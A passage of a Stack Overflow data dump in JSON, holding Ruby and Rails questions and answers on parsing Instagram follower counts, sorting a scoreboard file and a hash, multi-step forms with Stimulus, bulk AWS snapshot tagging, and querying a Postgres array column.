scraping instagram followers", "body": "<p>New on ruby/rails and currently in the process of learning it and writing specs. I've got these two methods for scraping instagram followers </p>\n\n<pre><code>def instagram_scraped_followers_count(instagram_username)\n        url = \"https://www.instagram.com/#{ CGI::escape(instagram_username) }/\"\n        body = HTTParty.get(url)\n\n        match = body.match(/(?&lt;=content\\=\")(?&lt;count&gt;\\d+[,.]?\\d*)(?&lt;unit&gt;[km])?(?=\\sFollowers)/) if body\n        match['count'].to_f * instagram_multiplier(match['unit']) if match\n      end\n\n      def instagram_multiplier(unit)\n        case unit\n        when 'm' then 1_000_000\n        when 'k' then 1_000\n        else 1\n        end\n      end\n</code></pre>\n\n<p>and added unit test for this as below:</p>\n\n<pre><code>  context '1,300 followers' do\n    let(:html_body) { '&lt;meta content=\"1,300 Followers, 1,408 Following, 395 Posts' }\n\n    it 'returns 1,300' do\n      expect(subject.stats[:instagram]).to eql(1_300.0)\n    end\n  end\n</code></pre>\n\n<p>My unit test is failing because of this <code>context '1,300 followers' do</code> and the error says that <code>expected: 1300.0  got: 1.0</code> What did I miss? Is it because there's no condition for it in <code>instagram_multiplier</code> method?</p>\n"}, {"tags": ["javascript", "ruby-on-rails", "ruby", "haml", "stimulusjs"], "comments": [{"owner": {"reputation": 428, "user_id": 5646692, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/15f9097b83c30e9a9df2f47ccc427f4b?s=128&d=identicon&r=PG&f=1", "display_name": "Hafiz", "link": "https://stackoverflow.com/users/5646692/hafiz"}, "edited": false, "score": 1, "creation_date": 1558437421, "post_id": 56232863, "comment_id": 99092820, "body": "There are few other ways you can create smart wizard in rails 1. <code>smartwizard</code> jquery plugin     Ref: <a href=\"http://techlaboratory.net/smartwizard/documentation\" rel=\"nofollow noreferrer\">techlaboratory.net/smartwizard/documentation</a> 2. <code>Wicked Gem</code> which is specifically for steps     Ref: <a href=\"https://github.com/schneems/wicked\" rel=\"nofollow noreferrer\">github.com/schneems/wicked</a>"}, {"owner": {"reputation": 67, "user_id": 9732722, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d51ae9bf08232bc377afdfc7671105e9?s=128&d=identicon&r=PG&f=1", "display_name": "Paco V.", "link": "https://stackoverflow.com/users/9732722/paco-v"}, "reply_to_user": {"reputation": 428, "user_id": 5646692, "user_type": "registered", "accept_rate": 33, "profile_image": "https://www.gravatar.com/avatar/15f9097b83c30e9a9df2f47ccc427f4b?s=128&d=identicon&r=PG&f=1", "display_name": "Hafiz", "link": "https://stackoverflow.com/users/5646692/hafiz"}, "edited": false, "score": 0, "creation_date": 1558440311, "post_id": 56232863, "comment_id": 99094487, "body": "Hi Fahad, thanks for your answer, but sadly, this is not the ultimate goal, to use <code>wicked gem</code> or <code>jQuery</code>, since I would like to avoid messing with the  controller but have rather a front end based approach."}], "owner": {"reputation": 67, "user_id": 9732722, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/d51ae9bf08232bc377afdfc7671105e9?s=128&d=identicon&r=PG&f=1", "display_name": "Paco V.", "link": "https://stackoverflow.com/users/9732722/paco-v"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 585, "favorite_count": 1, "answer_count": 0, "score": 1, "last_activity_date": 1581308665, "creation_date": 1558422374, "last_edit_date": 1581308665, "question_id": 56232863, "link": "https://stackoverflow.com/questions/56232863/how-i-can-create-a-wizard-multi-step-form-with-stimulus-js-and-rails", "title": "How I can create a wizard multi step form with stimulus js and rails", "body": "<p>I am developing a Rails 5.2 application and I want to create a multi step form editor (like the Stackoverflow one for writing new questions) but I do not quite grasp where to start.</p>\n\n<p>Looking at stackoverflow, the like minded questions and answers seems to be old and does not match what I am looking for. I want to avoid abusing jQuery if is not really needed, since as I realized, Stimulus JS could help me do that.</p>\n"}, {"tags": ["ruby", "libgosu"], "comments": [{"owner": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 5, "creation_date": 1558421774, "post_id": 56232443, "comment_id": 99084516, "body": "You can&#39;t sort a file right away. You have to read the text file and parse the name-score pairs into a sortable data structure like an array. You probably already tried something yourself. Show your attempts, please."}], "answers": [{"tags": [], "owner": {"reputation": 1673, "user_id": 3775934, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/i2TBD.png?s=128&g=1", "display_name": "Scrobot", "link": "https://stackoverflow.com/users/3775934/scrobot"}, "is_accepted": false, "score": 0, "last_activity_date": 1558426240, "creation_date": 1558426240, "answer_id": 56233909, "question_id": 56232443, "link": "https://stackoverflow.com/questions/56232443/sort-scoreboard-by-name-and-score-using-ruby/56233909#56233909", "title": "Sort scoreboard by name and score using ruby", "body": "<p>The base implementation of this case may be something like this:</p>\n\n<pre class=\"lang-rb prettyprint-override\"><code>def main\n\n  file = File.new(\"score.txt\", \"r\")\n  players = Array.new\n  score = Array.new\n  number_regex = /\\A[-+]?[0-9]*\\.?[0-9]+\\Z/\n\n  file.each_line do |line|\n    if(line.match(number_regex))\n      score &lt;&lt; line.delete(\" \\t\\r\\n\")\n    else\n      players &lt;&lt; line.delete(\" \\t\\r\\n\")\n    end\n  end\n\n  file.close\n\n  result = Hash.new\n  i = 0\n\n  while i &lt; players.length\n    result[players[i]] = score[i]\n    i += 1\n  end\n\n  print_score(result)\n\nend\n\ndef print_score(hash)\n  hash.each do |key,value|\n    puts key + \": \" + value\n  end\nend\n\nmain\n\n</code></pre>\n\n<p>But, I warn !!! This is just a basic implementation. This solution has some side effects, for example, if the data sequence of the data is broken, this algorithm will stop working.</p>\n\n<pre><code>player1\n10\nplayer2\nplayer3\n60\n</code></pre>\n\n<p>To implement a fully working solution, you need to check the next line when reading each line and validate it for the content of the desired values. If the sequence is broken, and after the value of \"playerN\" the number of points scored does not go, then consider in this case their absence as 0.\nIn general, creating a holistic solution in this case is not an easy task. And in order to choose the optimal solution, in fact, you did not provide enough data. Where does the .txt account is recorded from? Is it possible to change the source of the recording? And so on</p>\n"}, {"comments": [{"owner": {"reputation": 49, "user_id": 10667510, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-dHGvy7xrh9g/AAAAAAAAAAI/AAAAAAAAHa8/en2XvfGUuh8/photo.jpg?sz=128", "display_name": "David Lee", "link": "https://stackoverflow.com/users/10667510/david-lee"}, "edited": false, "score": 0, "creation_date": 1558444378, "post_id": 56235524, "comment_id": 99096927, "body": "i used the code from your help <code>score_sorted = data.each_slice(2).sort_by { |_, score| -score.to_i}.map{ |ary| ary.join(&#39; &#39;) }</code>, but the output is [&quot;player1&quot;, &quot;10&quot;, &quot;player2&quot;, &quot;13&quot;, &quot;player3&quot;, &quot;60&quot;] instead of [&quot;player3 60&quot;, &quot;player2 13&quot;, &quot;player1 10&quot;], by the way the sorting works"}], "tags": [], "owner": {"reputation": 9663, "user_id": 5239030, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/76JEw.png?s=128&g=1", "display_name": "iGian", "link": "https://stackoverflow.com/users/5239030/igian"}, "is_accepted": true, "score": 2, "last_activity_date": 1558431823, "creation_date": 1558431823, "answer_id": 56235524, "question_id": 56232443, "link": "https://stackoverflow.com/questions/56232443/sort-scoreboard-by-name-and-score-using-ruby/56235524#56235524", "title": "Sort scoreboard by name and score using ruby", "body": "<p>You need to read the file into an array, do some manipulation, then write back to file.\nAssuming the source file contains pairs of rows as showed..</p>\n\n<p>First read the lines of the file into an array, <a href=\"https://ruby-doc.org/core-2.6.3/IO.html#method-i-readlines\" rel=\"nofollow noreferrer\">File#readlines</a> (note, <code>chomp: true</code> for stripping <code>\"\\n\"</code>).</p>\n\n<pre><code>data = File.readlines('score.txt', chomp: true)\n#=&gt; [\"player1\", \"10\", \"player2\", \"13\", \"player3\", \"60\"]\n</code></pre>\n\n<p>Once you have your array, group every two elements(<a href=\"https://ruby-doc.org/core-2.6.3/Enumerable.html#method-i-each_slice\" rel=\"nofollow noreferrer\">Enumerable#each_slice</a>) and sort by the second element considered as an integer (<code>.to_i</code>) (<a href=\"https://ruby-doc.org/core-2.6.3/Enumerable.html#method-i-sort_by\" rel=\"nofollow noreferrer\">Enumerable#sort_by</a>). Note the <code>-</code> sign for reversing the order of sorting. As last operation <code>map</code> (<a href=\"https://ruby-doc.org/core-2.6.3/Enumerable.html#method-i-map\" rel=\"nofollow noreferrer\">Enumerable#map</a>) to <code>join</code> the pair of elements in the nested array (<a href=\"https://ruby-doc.org/core-2.6.3/Array.html#method-i-join\" rel=\"nofollow noreferrer\">Array#join</a>):</p>\n\n<pre><code>score_sorted = data.each_slice(2).sort_by { |_, score| -score.to_i}.map{ |ary| ary.join(' ') }\n#=&gt; [\"player3 60\", \"player2 13\", \"player1 10\"]\n</code></pre>\n\n<p>Finally, write the array back to file (<a href=\"https://ruby-doc.org/core-2.6.3/IO.html#method-c-open\" rel=\"nofollow noreferrer\">File#open</a>):</p>\n\n<pre><code>File.open(\"score_sorted.txt\", \"w+\") { |f| f.puts score_sorted }\n</code></pre>\n"}], "owner": {"reputation": 49, "user_id": 10667510, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-dHGvy7xrh9g/AAAAAAAAAAI/AAAAAAAAHa8/en2XvfGUuh8/photo.jpg?sz=128", "display_name": "David Lee", "link": "https://stackoverflow.com/users/10667510/david-lee"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 125, "favorite_count": 0, "accepted_answer_id": 56235524, "answer_count": 2, "score": -1, "last_activity_date": 1558431823, "creation_date": 1558420694, "question_id": 56232443, "link": "https://stackoverflow.com/questions/56232443/sort-scoreboard-by-name-and-score-using-ruby", "title": "Sort scoreboard by name and score using ruby", "body": "<p>i have a text file that consists of these:</p>\n\n<pre><code>player1\n10\nplayer2\n13\nplayer3\n60\n</code></pre>\n\n<p>These are the player name and score. For example, the score for player 1 is 10 and the score for player 2 is 13 and so on. I want to sort the text file by score. For example:</p>\n\n<pre><code>player3 60\nplayer2 13\nplayer1 10\n</code></pre>\n"}, {"tags": ["ruby-on-rails", "ruby", "ruby-on-rails-5"], "comments": [{"owner": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 0, "creation_date": 1558419764, "post_id": 56231951, "comment_id": 99083675, "body": "Since the whole library is rendered client-side \u2013 have you considered using one of the various JavaScript table sorting solutions out there?"}, {"owner": {"reputation": 13, "user_id": 10415360, "user_type": "registered", "profile_image": "https://graph.facebook.com/1891567207586037/picture?type=large", "display_name": "Kamil Pikula", "link": "https://stackoverflow.com/users/10415360/kamil-pikula"}, "reply_to_user": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 0, "creation_date": 1558419925, "post_id": 56231951, "comment_id": 99083723, "body": "Nope, I haven&#39;t considered. Do you have an idea?"}, {"owner": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 0, "creation_date": 1558420415, "post_id": 56231951, "comment_id": 99083930, "body": "<a href=\"https://mottie.github.io/tablesorter/docs/index.html\" rel=\"nofollow noreferrer\">tablesorter</a> maybe? You could also write your own, see <a href=\"https://stackoverflow.com/questions/14267781/sorting-html-table-with-javascript\">Sorting HTML table with JavaScript</a>"}, {"owner": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 0, "creation_date": 1558420578, "post_id": 56231951, "comment_id": 99083999, "body": "BTW, why did you put the data into a hash rather than a database table? Wouldn&#39;t it make more sense to use ActiveRecord, given that this is a Rails question?"}, {"owner": {"reputation": 13, "user_id": 10415360, "user_type": "registered", "profile_image": "https://graph.facebook.com/1891567207586037/picture?type=large", "display_name": "Kamil Pikula", "link": "https://stackoverflow.com/users/10415360/kamil-pikula"}, "reply_to_user": {"reputation": 95812, "user_id": 477037, "user_type": "registered", "accept_rate": 87, "profile_image": "https://www.gravatar.com/avatar/dde78fe4cdc16eb855d68ff7a8cd017d?s=128&d=identicon&r=PG", "display_name": "Stefan", "link": "https://stackoverflow.com/users/477037/stefan"}, "edited": false, "score": 0, "creation_date": 1558508318, "post_id": 56231951, "comment_id": 99119385, "body": "@Stefan because I&#39;m getting the data from the api in json and I don&#39;t need to keep them on the database. Your way works, but I used <code>tap</code> method in Ruby. Thanks. :)"}], "answers": [{"comments": [{"owner": {"reputation": 13, "user_id": 10415360, "user_type": "registered", "profile_image": "https://graph.facebook.com/1891567207586037/picture?type=large", "display_name": "Kamil Pikula", "link": "https://stackoverflow.com/users/10415360/kamil-pikula"}, "edited": false, "score": 0, "creation_date": 1558419304, "post_id": 56232041, "comment_id": 99083473, "body": "Unfortunately - no, <code>library</code> isn&#39;t an AR relation, its <code>ActiveSupport::HashWithIndifferentAccess</code>"}, {"owner": {"reputation": 8462, "user_id": 405865, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/e29f04f339715955060858e0e65e1311?s=128&d=identicon&r=PG", "display_name": "fphilipe", "link": "https://stackoverflow.com/users/405865/fphilipe"}, "reply_to_user": {"reputation": 13, "user_id": 10415360, "user_type": "registered", "profile_image": "https://graph.facebook.com/1891567207586037/picture?type=large", "display_name": "Kamil Pikula", "link": "https://stackoverflow.com/users/10415360/kamil-pikula"}, "edited": false, "score": 0, "creation_date": 1558419813, "post_id": 56232041, "comment_id": 99083695, "body": "@KamilPikula what are the keys and values? Are you saying it&#39;s an array of <code>ActiveSupport::HashWithIndifferentAccess</code> where each element is sort of a row and the column you want to sort by is a key in each hash?"}, {"owner": {"reputation": 8462, "user_id": 405865, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/e29f04f339715955060858e0e65e1311?s=128&d=identicon&r=PG", "display_name": "fphilipe", "link": "https://stackoverflow.com/users/405865/fphilipe"}, "reply_to_user": {"reputation": 13, "user_id": 10415360, "user_type": "registered", "profile_image": "https://graph.facebook.com/1891567207586037/picture?type=large", "display_name": "Kamil Pikula", "link": "https://stackoverflow.com/users/10415360/kamil-pikula"}, "edited": false, "score": 0, "creation_date": 1558420497, "post_id": 56232041, "comment_id": 99083965, "body": "@KamilPikula, sorry, missed that you had <code>library</code> in your question. Updated my answer accordingly."}, {"owner": {"reputation": 13, "user_id": 10415360, "user_type": "registered", "profile_image": "https://graph.facebook.com/1891567207586037/picture?type=large", "display_name": "Kamil Pikula", "link": "https://stackoverflow.com/users/10415360/kamil-pikula"}, "edited": false, "score": 0, "creation_date": 1558507283, "post_id": 56232041, "comment_id": 99118902, "body": "Damn it, I totally forgot about <code>tap</code> method in Ruby. It&#39;s works, thank you very much @fphilipe!"}], "tags": [], "owner": {"reputation": 8462, "user_id": 405865, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/e29f04f339715955060858e0e65e1311?s=128&d=identicon&r=PG", "display_name": "fphilipe", "link": "https://stackoverflow.com/users/405865/fphilipe"}, "is_accepted": true, "score": 0, "last_activity_date": 1558420472, "last_edit_date": 1558420472, "creation_date": 1558418896, "answer_id": 56232041, "question_id": 56231951, "link": "https://stackoverflow.com/questions/56231951/sort-by-in-hash-reverse-or-not-reverse-how/56232041#56232041", "title": "Sort_by in Hash - reverse or not reverse - how?", "body": "<p>Reverse <strong>does</strong> work:</p>\n\n<pre class=\"lang-rb prettyprint-override\"><code>library = {\"1\"=&gt;{\"title\"=&gt;\"bbb\", \"money\"=&gt;10}, \"2\"=&gt;{\"title\"=&gt;\"aaa\", \"money\"=&gt;12}}\n\nsort_column = \"money\"\n\nsort_direction = \"asc\"\nlibrary\n  .sort_by {|k| k[1][sort_column]}\n  .tap { |l| l.reverse! if sort_direction == \"desc\" }\n# =&gt; [[\"1\", {\"title\"=&gt;\"bbb\", \"money\"=&gt;10}], [\"2\", {\"title\"=&gt;\"aaa\", \"money\"=&gt;12}]]\n\nsort_direction = \"desc\"\nlibrary\n  .sort_by {|k| k[1][sort_column]}\n  .tap { |l| l.reverse! if sort_direction == \"desc\" }\n# =&gt; [[\"2\", {\"title\"=&gt;\"aaa\", \"money\"=&gt;12}], [\"1\", {\"title\"=&gt;\"bbb\", \"money\"=&gt;10}]]\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 54, "user_id": 11378443, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7309052c7afed1a17f2670858200ed09?s=128&d=identicon&r=PG&f=1", "display_name": "NensiMakawana", "link": "https://stackoverflow.com/users/11378443/nensimakawana"}, "is_accepted": false, "score": 0, "last_activity_date": 1558422671, "creation_date": 1558422671, "answer_id": 56232943, "question_id": 56231951, "link": "https://stackoverflow.com/questions/56231951/sort-by-in-hash-reverse-or-not-reverse-how/56232943#56232943", "title": "Sort_by in Hash - reverse or not reverse - how?", "body": "<p>you can sory hash as per below</p>\n\n<p>if sort by only title then</p>\n\n<pre><code>library.values.sort_by{|h| h[\"title\"] }\n</code></pre>\n\n<p>or you want to sort by first title and second money then use</p>\n\n<pre><code>library.values.sort_by{|h| [h[\"title\"], h[\"money\"]] }\n</code></pre>\n"}], "owner": {"reputation": 13, "user_id": 10415360, "user_type": "registered", "profile_image": "https://graph.facebook.com/1891567207586037/picture?type=large", "display_name": "Kamil Pikula", "link": "https://stackoverflow.com/users/10415360/kamil-pikula"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 94, "favorite_count": 0, "accepted_answer_id": 56232041, "answer_count": 2, "score": 0, "last_activity_date": 1558422671, "creation_date": 1558418492, "question_id": 56231951, "link": "https://stackoverflow.com/questions/56231951/sort-by-in-hash-reverse-or-not-reverse-how", "title": "Sort_by in Hash - reverse or not reverse - how?", "body": "<p>I have the hash, below:</p>\n\n<pre class=\"lang-rb prettyprint-override\"><code>library = {\"1\"=&gt;{\"title\"=&gt;\"bbb\", \"money\"=&gt;10}, \"2\"=&gt;{\"title\"=&gt;\"aaa\", \"money\"=&gt;12}}\n</code></pre>\n\n<p>and my application_helper.rb:</p>\n\n<pre class=\"lang-rb prettyprint-override\"><code>  def sortable_columns\n    %w[title money]\n  end\n\n  def sort_column\n    sortable_columns.include?(params[:column]) ? params[:column] : \"title\"\n  end\n\n  def sort_direction\n    %w[asc desc].include?(params[:direction]) ? params[:direction] : \"asc\"\n  end\n\n  def sort_link(column, title)\n    direction = column == sort_column &amp;&amp; sort_direction == \"asc\" ? \"desc\" : \"asc\"\n    icon = sort_direction == \"asc\" ? \"fa fa-arrow-down\" : \"fa fa-arrow-up\"\n    icon = column == sort_column ? icon : \"\"\n    link_to \"#{title} &lt;i class='#{icon}'&gt;&lt;/i&gt;\".html_safe, {column: column, direction: direction}\n  end\n</code></pre>\n\n<p>My table in table.html.erb:</p>\n\n<pre><code>          &lt;table class=\"table table-striped\"&gt;\n            &lt;thead&gt;\n            &lt;tr&gt;\n                &lt;th&gt;#&lt;/th&gt;\n                &lt;% sortable_columns.each do |column| %&gt;\n                  &lt;th&gt;&lt;%= sort_link column, column %&gt;&lt;/th&gt;\n                &lt;% end %&gt;\n            &lt;/tr&gt;\n            &lt;/thead&gt;\n            &lt;tbody&gt;\n              &lt;% library.sort_by {|k| k[1][sort_column]}.each_with_index do |data, i| %&gt;\n               ...\n\n              &lt;% end %&gt;\n            &lt;/tbody&gt;\n          &lt;/table&gt;\n</code></pre>\n\n<p>and now - after click in \"title\" or \"money\" header - table's sorting ASC. I would like it to display DESC when clicked again (with icon arrow-down). How can this be done? I thought about \"reverse\", after <code>library.sort_by {|k| k[1][sort_column]}</code>, but doesn't work.</p>\n"}, {"tags": ["ruby", "amazon-web-services", "sdk"], "comments": [{"owner": {"reputation": 162605, "user_id": 174777, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/6PnNW.jpg?s=128&g=1", "display_name": "John Rotenstein", "link": "https://stackoverflow.com/users/174777/john-rotenstein"}, "edited": false, "score": 0, "creation_date": 1558406125, "post_id": 56229952, "comment_id": 99080434, "body": "What is the basis of your &quot;fear&quot;? If it fails, could the Ruby script simply restart and tag the remaining untagged instances? Also, you might be interested in <a href=\"https://docs.aws.amazon.com/awsconsolehelpdocs/latest/gsg/tag-editor.html\" rel=\"nofollow noreferrer\">Working with Tag Editor - AWS Management Console</a>."}, {"owner": {"reputation": 1, "user_id": 11510588, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e3a312ca92179097bad4c002f6c59c7?s=128&d=identicon&r=PG&f=1", "display_name": "abhiks", "link": "https://stackoverflow.com/users/11510588/abhiks"}, "reply_to_user": {"reputation": 162605, "user_id": 174777, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/6PnNW.jpg?s=128&g=1", "display_name": "John Rotenstein", "link": "https://stackoverflow.com/users/174777/john-rotenstein"}, "edited": false, "score": 0, "creation_date": 1558408384, "post_id": 56229952, "comment_id": 99080797, "body": "Thanks for your input.  In my case if the script breaks due to API call, on incomplete tagging operation it may cause in consistent tagging on few snapshots, upon which the checks are put before tagging. So on failure, the logic of script may stand redundant.  That&#39;s why I was curious in knowing a good way to ensure it goes in one shot on tagging about 2000 resource."}, {"owner": {"reputation": 23016, "user_id": 2981429, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/ZcCXx.jpg?s=128&g=1", "display_name": "max pleaner", "link": "https://stackoverflow.com/users/2981429/max-pleaner"}, "edited": false, "score": 0, "creation_date": 1558426572, "post_id": 56229952, "comment_id": 99086737, "body": "Processing the records in chunks is a good idea, such as using <a href=\"https://apidock.com/rails/Array/in_groups_of\" rel=\"nofollow noreferrer\">in_groups_of</a> or <a href=\"https://apidock.com/rails/ActiveRecord/Batches/find_in_batches\" rel=\"nofollow noreferrer\">find_in_batches</a>. And for each batch you can perform a bulk update, such as with the <a href=\"https://github.com/zdennis/activerecord-import\" rel=\"nofollow noreferrer\">activerecord-import</a> gem. You can tweak around the batch size, it&#39;s a balance between the size of each query and the number of queries. And then you can use rescue to implement some retry logic."}], "owner": {"reputation": 1, "user_id": 11510588, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/6e3a312ca92179097bad4c002f6c59c7?s=128&d=identicon&r=PG&f=1", "display_name": "abhiks", "link": "https://stackoverflow.com/users/11510588/abhiks"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 40, "favorite_count": 0, "answer_count": 0, "score": 0, "last_activity_date": 1558402030, "creation_date": 1558402030, "question_id": 56229952, "link": "https://stackoverflow.com/questions/56229952/good-practice-to-tag-resources-with-bulk-list-of-array", "title": "Good practice to tag resources with bulk list of array", "body": "<p>We have a scenario, where we need to tag with 4 tags' key value pair for a large list of snapshots. While we traverse the list of snapshots for this also some check would be present to do checks on already present snapshots.</p>\n\n<p>Now what I can tag them with create_tags command, I fear due to API call it may fail in between and the tagging may remain incomplete. What is the good way to tag resources in such cases with minimizing risk of failure?</p>\n\n<p>I am using aws-sdk for ruby.</p>\n"}, {"tags": ["ruby-on-rails", "ruby", "activerecord"], "comments": [{"owner": {"reputation": 18856, "user_id": 1359650, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/dffc4318ac93e728a26c8e8b51b4eb37?s=128&d=identicon&r=PG", "display_name": "jvillian", "link": "https://stackoverflow.com/users/1359650/jvillian"}, "edited": false, "score": 0, "creation_date": 1558398423, "post_id": 56229598, "comment_id": 99079142, "body": "Do you have the option of changing the design? An array of ids seems like not the greatest idea."}, {"owner": {"reputation": 5, "user_id": 10863157, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-5dMAqno0nr0/AAAAAAAAAAI/AAAAAAAAAAc/UZyEJXpY4BY/photo.jpg?sz=128", "display_name": "Sylvance", "link": "https://stackoverflow.com/users/10863157/sylvance"}, "reply_to_user": {"reputation": 18856, "user_id": 1359650, "user_type": "registered", "accept_rate": 57, "profile_image": "https://www.gravatar.com/avatar/dffc4318ac93e728a26c8e8b51b4eb37?s=128&d=identicon&r=PG", "display_name": "jvillian", "link": "https://stackoverflow.com/users/1359650/jvillian"}, "edited": false, "score": 0, "creation_date": 1558398972, "post_id": 56229598, "comment_id": 99079266, "body": "No I don&#39;t have this option currently."}, {"owner": {"reputation": 394580, "user_id": 479863, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/ArUCE.jpg?s=128&g=1", "display_name": "mu is too short", "link": "https://stackoverflow.com/users/479863/mu-is-too-short"}, "edited": false, "score": 0, "creation_date": 1558401242, "post_id": 56229598, "comment_id": 99079622, "body": "Which database and is <code>houses</code> a real array or some <code>serialize</code>d YAML mess?"}, {"owner": {"reputation": 5, "user_id": 10863157, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-5dMAqno0nr0/AAAAAAAAAAI/AAAAAAAAAAc/UZyEJXpY4BY/photo.jpg?sz=128", "display_name": "Sylvance", "link": "https://stackoverflow.com/users/10863157/sylvance"}, "edited": false, "score": 0, "creation_date": 1558401695, "post_id": 56229598, "comment_id": 99079691, "body": "It is a postgresql database and yes houses is serialized."}, {"owner": {"reputation": 23016, "user_id": 2981429, "user_type": "registered", "accept_rate": 94, "profile_image": "https://i.stack.imgur.com/ZcCXx.jpg?s=128&g=1", "display_name": "max pleaner", "link": "https://stackoverflow.com/users/2981429/max-pleaner"}, "edited": false, "score": 0, "creation_date": 1558406642, "post_id": 56229598, "comment_id": 99080516, "body": "<a href=\"https://stackoverflow.com/questions/19925641/check-if-a-postgres-json-array-contains-a-string\" title=\"check if a postgres json array contains a string\">stackoverflow.com/questions/19925641/&hellip;</a>"}, {"owner": {"reputation": 394580, "user_id": 479863, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/ArUCE.jpg?s=128&g=1", "display_name": "mu is too short", "link": "https://stackoverflow.com/users/479863/mu-is-too-short"}, "edited": false, "score": 1, "creation_date": 1558408587, "post_id": 56229598, "comment_id": 99080838, "body": "If you&#39;re using <code>serialize :houses</code> then you&#39;re in for some pain, if the <code>houses</code> column is an <code>integer[]</code> then there are some <a href=\"https://www.postgresql.org/docs/current/functions-array.html\" rel=\"nofollow noreferrer\">array functions and operators</a> that you can use."}], "answers": [{"tags": [], "owner": {"reputation": 77, "user_id": 10966941, "user_type": "registered", "profile_image": "https://lh4.googleusercontent.com/-HMgbK5sXujY/AAAAAAAAAAI/AAAAAAAAA90/Yl5CkKqnhrs/photo.jpg?sz=128", "display_name": "Zaid Annas", "link": "https://stackoverflow.com/users/10966941/zaid-annas"}, "is_accepted": false, "score": 0, "last_activity_date": 1558435657, "last_edit_date": 1558435657, "creation_date": 1558435055, "answer_id": 56236457, "question_id": 56229598, "link": "https://stackoverflow.com/questions/56229598/rails-activerecord-find-parent-given-child-model-id-when-parent-has-a-field-whi/56236457#56236457", "title": "Rails activerecord find parent given child model id, when parent has a field which is array of child ids", "body": "<p>In House class you specify <code>belongs_to</code> association with lambda like this</p>\n\n<pre><code>class House &lt; ApplicationRecord\n...\nbelongs_to :estate, -&gt;(house) { Estate.where(\"?=ANY(houses)\", house.id).first }\n...\nend\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 5, "user_id": 10863157, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-5dMAqno0nr0/AAAAAAAAAAI/AAAAAAAAAAc/UZyEJXpY4BY/photo.jpg?sz=128", "display_name": "Sylvance", "link": "https://stackoverflow.com/users/10863157/sylvance"}, "edited": false, "score": 0, "creation_date": 1558487160, "post_id": 56237036, "comment_id": 99114298, "body": "Estate.where(&quot;?= ANY(houses)&quot;, house.id) worked for me. Thank you much Ketan Mangukiya."}, {"owner": {"reputation": 5, "user_id": 10863157, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-5dMAqno0nr0/AAAAAAAAAAI/AAAAAAAAAAc/UZyEJXpY4BY/photo.jpg?sz=128", "display_name": "Sylvance", "link": "https://stackoverflow.com/users/10863157/sylvance"}, "edited": false, "score": 0, "creation_date": 1558487281, "post_id": 56237036, "comment_id": 99114314, "body": "This resource was also helpful <a href=\"https://edgeguides.rubyonrails.org/active_record_postgresql.html#array\" rel=\"nofollow noreferrer\">https://edgeguides.rubyonrails.org/active_record_postgresql.&zwnj;&#8203;html#array</a>"}], "tags": [], "owner": {"reputation": 145, "user_id": 8229753, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/22660980995e03dfd59812c9acf93db8?s=128&d=identicon&r=PG&f=1", "display_name": "Ketan Mangukiya", "link": "https://stackoverflow.com/users/8229753/ketan-mangukiya"}, "is_accepted": true, "score": 0, "last_activity_date": 1558437100, "creation_date": 1558437100, "answer_id": 56237036, "question_id": 56229598, "link": "https://stackoverflow.com/questions/56229598/rails-activerecord-find-parent-given-child-model-id-when-parent-has-a-field-whi/56237036#56237036", "title": "Rails activerecord find parent given child model 